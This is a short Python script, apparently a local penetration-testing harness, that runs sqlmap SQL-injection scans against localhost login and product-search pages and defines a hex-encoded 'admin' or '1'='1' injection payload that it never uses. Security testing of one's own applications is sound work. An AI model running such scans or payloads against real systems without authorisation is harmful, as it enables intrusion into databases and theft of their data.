#!/usr/bin/env python3
import subprocess
import requests
import time

def test_sqlmap():
    print("🔍 Starting SQLMap Tests...")
    
    # Test 1: Basic SQL Injection
    print("\n1. Testing Basic SQL Injection")
    cmd = [
        'sqlmap', 
        '-u', 'http://localhost:8080/login.php',
        '--data', 'username=test&password=test',
        '--method', 'POST',
        '--level', '2',
        '--risk', '2',
        '--batch'
    ]
    subprocess.run(cmd)
    
    # Test 2: SQL Injection with Hex bypass
    print("\n2. Testing Hex Bypass")
    hex_payload = "0x61646d696e27206f72202731273d2731"  # admin' or '1'='1 in hex
    cmd = [
        'sqlmap',
        '-u', 'http://localhost:8080/products.php?search=test',
        '--hex',
        '--batch'
    ]
    subprocess.run(cmd)

if __name__ == "__main__":
    test_sqlmap()
